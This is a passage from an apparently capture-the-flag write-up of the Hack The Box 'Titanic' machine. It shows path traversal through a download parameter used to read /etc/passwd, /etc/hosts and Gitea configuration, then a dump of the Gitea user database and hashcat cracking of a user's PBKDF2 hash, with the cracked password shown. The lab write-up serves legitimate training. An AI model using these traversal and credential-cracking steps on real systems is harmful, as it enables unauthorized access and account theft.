&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">ssh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">hostkey&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="mi">73&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">76&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">eb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">04&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">f1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">fe&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">c9&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">e9&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">80&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">44&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">46&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ECDSA&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="nx">d5&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">bd&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">86&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">eb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">88&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">63&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">88&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">04&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ED25519&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">80&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">http&lt;/span> &lt;span class="nx">Apache&lt;/span> &lt;span class="nx">httpd&lt;/span> &lt;span class="mf">2.4.52&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">title&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Did&lt;/span> &lt;span class="nx">not&lt;/span> &lt;span class="nx">follow&lt;/span> &lt;span class="nx">redirect&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//titanic.htb/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">header&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Apache&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">2.4.52&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">methods&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="nx">Supported&lt;/span> &lt;span class="nx">Methods&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">GET&lt;/span> &lt;span class="nx">HEAD&lt;/span> &lt;span class="nx">POST&lt;/span> &lt;span class="nx">OPTIONS&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;h2 id="user">User
&lt;/h2>&lt;h3 id="path-traversal">Path traversal
&lt;/h3>&lt;p>While exploring &lt;code>titanic.htb&lt;/code>, we notice that if we submit the booking form, a JSON of our booking data is downloaded.&lt;br>
&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Titanic-web.png"
width="1293"
height="681"
srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Titanic-web_hu_ddb956ceb2724edd.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Titanic-web_hu_bbcc5800f990521c.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="189"
data-flex-basis="455px"
>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="nx">a41afb2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">469&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">d75&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="nx">faf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">c1b70d398be&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">json&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nx">jq&lt;/span> &lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;test&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;email&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;test@test.com&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;phone&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;test-01&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;date&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;2025-06-18&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;cabin&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;Deluxe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
On Burp, the &lt;code>ticket&lt;/code> parameter via the &lt;code>/download&lt;/code> endpoint allows specifying the file to download.&lt;br>
&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-ticket.png"
width="972"
height="315"
srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-ticket_hu_f4731d2344060d02.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-ticket_hu_aa7eb074421b0fe0.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="308"
data-flex-basis="740px"
>&lt;br>
The lack of control or validation on this parameter allows us to read files on the machine via a path traversal.&lt;br>
This vulnerability allows us to retrieve the following information:&lt;br>
&lt;code>/etc/passwd&lt;/code> indicates the existence of the user &lt;code>developer&lt;/code>.&lt;br>
&lt;code>/etc/hosts&lt;/code> allows us to retrieve a new subdomain, &lt;code>dev&lt;/code>.&lt;br>
&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-LFI1.png"
width="1146"
height="394"
srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-LFI1_hu_398ef87eee89ccdf.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-LFI1_hu_cf400f71c78cf790.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="290"
data-flex-basis="698px"
>&lt;br>
&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-LFI2.png"
width="1064"
height="352"
srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-LFI2_hu_1b6ed4cfea7e44b1.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-LFI2_hu_cd583e94cbca5a7e.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="302"
data-flex-basis="725px"
>&lt;/p>
&lt;h3 id="gitea">Gitea
&lt;/h3>&lt;p>For now, we can&amp;rsquo;t go further, lets explore &lt;code>dev.titanic.htb&lt;/code>.&lt;br>
We find an instance of &lt;a class="link" href="https://about.gitea.com/" target="_blank" rel="noopener"
>Gitea&lt;/a>, a self-hosted version control tool using git.
&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-1.png"
width="628"
height="352"
srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-1_hu_224b01fb6060a811.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-1_hu_6ab8ac4d6ed83518.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="178"
data-flex-basis="428px"
>&lt;br>
We find two publicly accessible repositories, &lt;code>docker-config&lt;/code> and &lt;code>flask-app&lt;/code> .&lt;br>
&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-2.png"
width="893"
height="252"
srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-2_hu_18f51c3609337f0f.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-2_hu_4256cc69bc2f751d.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="354"
data-flex-basis="850px"
>&lt;br>
In the &lt;code>docker-config&lt;/code> repository, we find MySQL crendentials in the file &lt;code>/mysql/docker-compose.yml&lt;/code>.&lt;br>
The nmap scan did not identify MySQL access, we keep these credentials aside.&lt;br>
&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-3.png"
width="290"
height="359"
srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-3_hu_596b3fdf310276eb.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-3_hu_f8ecd78027762aec.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="80"
data-flex-basis="193px"
>&lt;br>
Still in this same repo, in &lt;code>/gitea/docker-compose.yml&lt;/code>, we find the path to a volume.&lt;br>
&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-volume.png"
width="400"
height="341"
srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-volume_hu_9f7270978027f8b8.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-volume_hu_3c048130cc739e3f.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="117"
data-flex-basis="281px"
>&lt;br>
Using this path, the previously found path traversal vulnerability and Gitea documentation, we can retrieve the Gitea configuration file.&lt;br>
After several attempts, it is located at &lt;code>/home/developer/gitea/data/gitea/conf/app.ini&lt;/code>.&lt;br>
In this config file, we find the path of the Gitea database, we use the website to retrieve it.&lt;br>
&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-4.png"
width="1247"
height="361"
srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-4_hu_402a332ce390f6ec.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-4_hu_1aeb873caa9af4ee.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="345"
data-flex-basis="829px"
>&lt;br>
Exploring this database with sqlite3, we can retrieve the hashes of &lt;code>developer&lt;/code> and &lt;code>administrator&lt;/code>.&lt;br>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">sqlite3&lt;/span> &lt;span class="nx">gitea&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">db&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sqlite&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="k">select&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">enabled&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">pbkdf2&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">50000&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">50&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">70&lt;/span>&lt;span class="nx">a5bd0c1a5d23caa49030172cdcabdc&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">d149e5fbd1b20cf31db3e3c6a28fc9b&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">en&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">US&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="mi">1722595379&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1722597477&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1722597477&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mf">2e1&lt;/span>&lt;span class="nx">e70639ac6b0eecbdab4a3d19e0f44&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">gitea&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">auto&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">2&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">enabled&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">pbkdf2&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">50000&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">50&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="nx">ce6f07fc9b557bc070fa7bef76a0d15&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="nx">bf3e3452b78544f8bee9400d6936d34&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">en&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">US&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="mi">1722595646&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1722603397&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1722603397&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">e2d95b7e207e432f62f3508be406c11b&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">gitea&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">auto&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
The hashes are in PBKDF2 format and can be converted using &lt;a class="link" href="https://github.com/hashcat/hashcat/pull/4154/files#diff-ccd519555457fa8e0c74b0dc7bd66727216dd446c7bcff8cd5196fe919e2b000" target="_blank" rel="noopener"
>gitea2hashcat.py&lt;/a> to be compatible with Hashcat. Then, we can easily retrieve the &lt;code>developer&lt;/code> account password.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="hl">&lt;span class="lnt">6
&lt;/span>&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">sqlite3&lt;/span> &lt;span class="nx">gitea&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">db&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="k">select&lt;/span> &lt;span class="nx">salt&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">passwd&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">gitea2hashcat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Run&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">output&lt;/span> &lt;span class="nx">hashes&lt;/span> &lt;span class="nx">through&lt;/span> &lt;span class="nx">hashcat&lt;/span> &lt;span class="nx">mode&lt;/span> &lt;span class="mi">10900&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">PBKDF2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">HMAC&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">SHA256&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sha256&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">50000&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">LRSeX70bIM8x2z48aij8mw&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">y6IMz5J9OtBWe2gWFzLT&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="nx">oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY&lt;/span>&lt;span class="p">=&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sha256&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">50000&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">PjRSt4VE&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">L7pQA1pNtNA&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="nx">THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">F2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="nx">wvxaCYZJjRE6llM&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">=&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">hashcat&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="mi">10900&lt;/span> &lt;span class="nx">hash&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wordlists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rockyou&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sha256&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">50000&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">PjRSt4VE&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">L7pQA1pNtNA&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="nx">THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">F2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="nx">wvxaCYZJjRE6llM&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">=:&lt;/span>&lt;span class="mi">25282528&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
